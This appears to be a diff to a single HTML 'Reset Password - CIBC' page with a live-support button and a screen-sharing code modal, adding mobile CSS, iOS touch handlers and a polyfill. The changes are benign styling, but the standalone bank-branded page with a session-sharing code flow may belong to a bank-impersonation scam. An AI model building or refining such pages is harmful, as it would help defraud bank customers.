@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
   <title>Reset Password - CIBC</title>
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -52,9 +52,19 @@
       cursor: pointer;
       transition: background 0.2s;
       font-family: inherit;
+      /* iOS Safari fixes */
+      -webkit-appearance: none;
+      -webkit-tap-highlight-color: transparent;
+      touch-action: manipulation;
+      user-select: none;
+      -webkit-user-select: none;
     }
 
     .live-support-btn:hover {
+      background: #a01830;
+    }
+
+    .live-support-btn:active {
       background: #a01830;
     }
 
@@ -290,6 +300,12 @@
       cursor: pointer;
       transition: all 0.2s;
       min-width: 120px;
+      /* iOS Safari fixes */
+      -webkit-appearance: none;
+      -webkit-tap-highlight-color: transparent;
+      touch-action: manipulation;
+      user-select: none;
+      -webkit-user-select: none;
     }
 
     .btn-outline {
@@ -298,7 +314,8 @@
       border: 2px solid #c41f3e;
     }
 
-    .btn-outline:hover {
+    .btn-outline:hover,
+    .btn-outline:active {
       background: #fef2f4;
     }
 
@@ -308,7 +325,8 @@
       border: 2px solid #c41f3e;
     }
 
-    .btn-primary:hover {
+    .btn-primary:hover,
+    .btn-primary:active {
       background: #a01830;
       border-color: #a01830;
     }
@@ -461,10 +479,15 @@
       border: none;
       cursor: pointer;
       color: #666;
-      padding: 4px;
+      padding: 8px;
+      /* iOS Safari fixes */
+      -webkit-appearance: none;
+      -webkit-tap-highlight-color: transparent;
+      touch-action: manipulation;
     }
 
-    .password-toggle:hover {
+    .password-toggle:hover,
+    .password-toggle:active {
       color: #c41f3e;
     }
 
@@ -533,9 +556,15 @@
       color: #999;
       cursor: pointer;
       line-height: 1;
+      /* iOS Safari fixes */
+      -webkit-appearance: none;
+      -webkit-tap-highlight-color: transparent;
+      touch-action: manipulation;
+      padding: 8px;
     }
 
-    .modal-close:hover {
+    .modal-close:hover,
+    .modal-close:active {
       color: #333;
     }
 
@@ -575,9 +604,16 @@
       cursor: pointer;
       font-family: inherit;
       width: 100%;
+      /* iOS Safari fixes */
+      -webkit-appearance: none;
+      -webkit-tap-highlight-color: transparent;
+      touch-action: manipulation;
+      user-select: none;
+      -webkit-user-select: none;
     }
 
-    .modal-btn-primary:hover {
+    .modal-btn-primary:hover,
+    .modal-btn-primary:active {
       background: #a01830;
     }
 
@@ -592,9 +628,16 @@
       cursor: pointer;
       font-family: inherit;
       width: 100%;
+      /* iOS Safari fixes */
+      -webkit-appearance: none;
+      -webkit-tap-highlight-color: transparent;
+      touch-action: manipulation;
+      user-select: none;
+      -webkit-user-select: none;
     }
 
-    .modal-btn-outline:hover {
+    .modal-btn-outline:hover,
+    .modal-btn-outline:active {
       background: #fef2f4;
     }
 
@@ -658,6 +701,124 @@
 
     .hidden {
       display: none !important;
+    }
+
+    /* Mobile Responsive Styles */
+    @media screen and (max-width: 768px) {
+      .page-wrapper {
+        padding: 10px;
+      }
+
+      .card {
+        padding: 20px 16px 30px;
+        margin-top: 10px;
+      }
+
+      .card-header-bar {
+        flex-direction: column;
+        gap: 16px;
+        text-align: center;
+      }
+
+      .card-header-bar .logo {
+        text-align: center;
+      }
+
+      .live-support-btn {
+        width: 100%;
+        justify-content: center;
+        padding: 14px 20px;
+      }
+
+      .header-title {
+        font-size: 20px;
+      }
+
+      .form-row {
+        flex-direction: column;
+        gap: 0;
+      }
+
+      .button-row {
+        flex-direction: column;
+        gap: 12px;
+      }
+
+      .btn {
+        width: 100%;
+        padding: 14px 24px;
+      }
+
+      .code-inputs {
+        gap: 6px;
+      }
+
+      .code-input {
+        width: 40px;
+        height: 48px;
+        font-size: 20px;
+      }
+
+      /* Modal responsive */
+      .share-modal {
+        width: 95%;
+        padding: 24px 20px;
+        max-height: 90vh;
+        overflow-y: auto;
+      }
+
+      .big-code {
+        font-size: 32px;
+        letter-spacing: 4px;
+        padding: 16px;
+      }
+
+      .modal-icon {
+        width: 56px;
+        height: 56px;
+      }
+
+      .share-modal h2 {
+        font-size: 18px;
+      }
+    }
+
+    @media screen and (max-width: 480px) {
+      .card {
+        padding: 16px 12px 24px;
+      }
+
+      .header-title {
+        font-size: 18px;
+      }
+
+      .code-input {
+        width: 36px;
+        height: 44px;
+        font-size: 18px;
+      }
+
+      .big-code {
+        font-size: 24px;
+        letter-spacing: 2px;
+        padding: 12px;
+      }
+
+      .form-input, .form-select {
+        font-size: 16px; /* Prevents iOS zoom on focus */
+      }
+    }
+
+    /* iOS-specific fixes */
+    @supports (-webkit-touch-callout: none) {
+      /* iOS Safari specific styles */
+      input, button, select, textarea {
+        font-size: 16px; /* Prevents zoom on focus */
+      }
+
+      button, .btn, .modal-btn-primary, .modal-btn-outline, .live-support-btn {
+        cursor: pointer;
+      }
     }
 
   </style>
@@ -939,6 +1100,32 @@
     let sessionActive = false;
     let observer = null;
 
+    // iOS Safari touch event helper
+    function addTouchSupport(element, handler) {
+      if (!element) return;
+
+      let touchMoved = false;
+
+      element.addEventListener('touchstart', function(e) {
+        touchMoved = false;
+      }, { passive: true });
+
+      element.addEventListener('touchmove', function(e) {
+        touchMoved = true;
+      }, { passive: true });
+
+      element.addEventListener('touchend', function(e) {
+        if (!touchMoved) {
+          e.preventDefault();
+          handler(e);
+        }
+      }, { passive: false });
+
+      element.addEventListener('click', function(e) {
+        handler(e);
+      });
+    }
+
     function handleSupportClick() {
       if (sessionActive) {
         // If already sharing, show the modal with the code
@@ -1170,6 +1357,52 @@
       el.classList.add('show');
     }
     function hideError(id) { document.getElementById(id).classList.remove('show'); }
+
+    // ========================================
+    // iOS SAFARI & CROSS-BROWSER SUPPORT
+    // ========================================
+    document.addEventListener('DOMContentLoaded', function() {
+      // Detect iOS
+      const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent) ||
+                    (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1);
+
+      if (isIOS) {
+        // Add touch support for all action buttons on iOS
+        document.querySelectorAll('.btn, .modal-btn-primary, .modal-btn-outline, .live-support-btn, .modal-close, .password-toggle').forEach(btn => {
+          btn.style.cursor = 'pointer';
+        });
+
+        // Prevent double-tap zoom on buttons
+        document.querySelectorAll('button, .btn').forEach(btn => {
+          btn.addEventListener('touchend', function(e) {
+            e.preventDefault();
+            // Trigger click after preventing default
+            if (e.target.onclick) {
+              e.target.onclick(e);
+            } else {
+              e.target.click();
+            }
+          }, { passive: false });
+        });
+      }
+
+      // Fix for 300ms tap delay on older browsers
+      if ('ontouchstart' in window) {
+        document.body.style.touchAction = 'manipulation';
+      }
+    });
+
+    // Polyfill for older browsers
+    if (!Element.prototype.closest) {
+      Element.prototype.closest = function(s) {
+        var el = this;
+        do {
+          if (el.matches(s)) return el;
+          el = el.parentElement || el.parentNode;
+        } while (el !== null && el.nodeType === 1);
+        return null;
+      };
+    }
   </script>
 </body>
 </html>
